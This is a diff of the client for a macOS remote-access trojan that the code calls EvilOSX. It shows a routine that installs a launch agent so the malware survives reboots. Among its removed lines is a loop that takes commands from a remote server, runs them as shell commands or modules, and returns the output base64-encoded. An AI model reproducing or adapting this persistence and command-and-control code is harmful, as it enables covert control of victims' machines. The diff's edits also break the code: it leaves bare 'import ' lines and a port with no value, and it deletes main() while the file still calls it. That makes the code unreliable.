@@ -17,12 +17,12 @@ import traceback
 import os
 import base64
 from StringIO import StringIO
-import sys
-import ssl
-import logging
+import 
+import 
+import 
 
-SERVER_HOST = "127.0.0.1"
-SERVER_PORT = 1337
+SERVER_HOST = ""
+SERVER_PORT = 
 DEVELOPMENT = False
 LAUNCH_AGENT_NAME = "com.apple.EvilOSX"
 
@@ -203,7 +203,7 @@ def send_response(response):
 
 
 def setup_persistence():
-    """Makes EvilOSX persist system reboots."""
+    """Makes OSX-RAT persist system reboots."""
     run_command("mkdir -p {0}".format(get_program_directory()))
     run_command("mkdir -p {0}".format(get_launch_agent_directory()))
 
@@ -232,7 +232,7 @@ def setup_persistence():
     with open(get_launch_agent_file(), "w") as open_file:
         open_file.write(launch_agent_create)
 
-    # Move EvilOSX
+    # Move OSX-RAT
     log.debug("Moving EvilOSX...")
 
     if DEVELOPMENT:
@@ -299,63 +299,6 @@ def get_ca_file():
         return ca_file
     else:
         return ca_file
-
-
-def main():
-    """Main program loop."""
-    last_active = time.time()  # The last time a command was requested from the server.
-    idle = False
-
-    if os.path.dirname(os.path.realpath(__file__)).lower() != get_program_directory().lower():
-        if not DEVELOPMENT:
-            # Setup persistence.
-            setup_persistence()
-
-    while True:
-        try:
-            log.info("Receiving command...")
-            command_type, module_name, command = receive_command()
-
-            if command:
-                last_active = time.time()
-                idle = False
-
-                if command_type == "COMMAND":
-                    # Run a system command.
-                    log.info("Running command: %s", command)
-
-                    send_response("{0}||{1}".format(
-                        "COMMAND", base64.b64encode(run_command(command, cleanup=False))
-                    ))
-                elif command_type == "MODULE":
-                    # Run a module.
-                    log.info("Running module: %s", module_name)
-
-                    send_response(run_module(command, module_name))
-            else:
-                log.info("No command received.")
-
-                if idle:
-                    time.sleep(30)
-                elif (time.time() - last_active) > IDLE_TIME:
-                    log.info("The last command was a while ago, switching to idle...")
-                    idle = True
-                else:
-                    time.sleep(COMMAND_INTERVAL)
-        except Exception as ex:
-            if "Connection refused" in str(ex):
-                # The server is offline.
-                log.warn("Failed to connect to the server.")
-                time.sleep(5)
-            elif "certificate" in str(ex):
-                # Invalid certificate authority.
-                log.error("Error: %s", str(ex))
-                log.error("Invalid certificate authority, removing...")
-                os.remove(get_program_directory() + "/server_cert.pem")
-            else:
-                log.error(traceback.format_exc())
-                time.sleep(5)
-
 
 if __name__ == '__main__':
     main()
